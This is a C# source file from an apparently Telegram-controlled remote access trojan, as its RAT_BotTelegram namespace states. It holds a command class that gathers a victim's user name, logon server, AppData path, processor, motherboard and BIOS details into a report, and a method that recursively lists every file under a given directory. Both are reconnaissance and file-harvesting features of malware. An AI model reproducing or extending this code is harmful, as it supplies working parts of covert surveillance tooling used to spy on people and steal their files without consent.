using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;
using RAT_BotTelegram.Lib;
using System.IO;

namespace RAT_BotTelegram.Lib {
    class CommandsFeatures {
        public Features fs = new Features();

        public String PC_Info() {
            Console.WriteLine(fs.getArchitecture());
            String Info = "Detailed Computer Information" +

                "\n\n*UserData *" +
                "\n - User Name: "+ fs.getUserName() +
                "\n - User Profile: C:\\User\\" + fs.getUserName() +
                "\n - User Domain: " + fs.getUserName() +
                "\n - Logon Server: " + fs.getLogonServer() +
                "\n - AppData: C:\\Users\\" + fs.getUserName() + @"\AppData\Roaming " +
                "\n - Home Path: \\Users\\" + fs.getUserName() +


                "\n\n*Processor *" +
                "\n - Name: " + fs.getProcessorName() +
                "\n - Frequency: " + fs.getProcessorGhz() + " Ghz"+
                "\n - Architecture: " + fs.getArchitecture() +


                "\n\n*Motherboard *"+
                "\n - Name: " + fs.getMotherboardName() +
                "\n - Manufacturer: " + fs.getMotherboardManufacturer() +
                "\n - BIOSVendor: " + fs.getBIOSVendor() +

                "";


            return Info;
        }

        public string[] GetFile(string dir) {
            // Obtiene Nombre del procesador
            string[] allfiles = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);

            return allfiles;
        }

    }
}
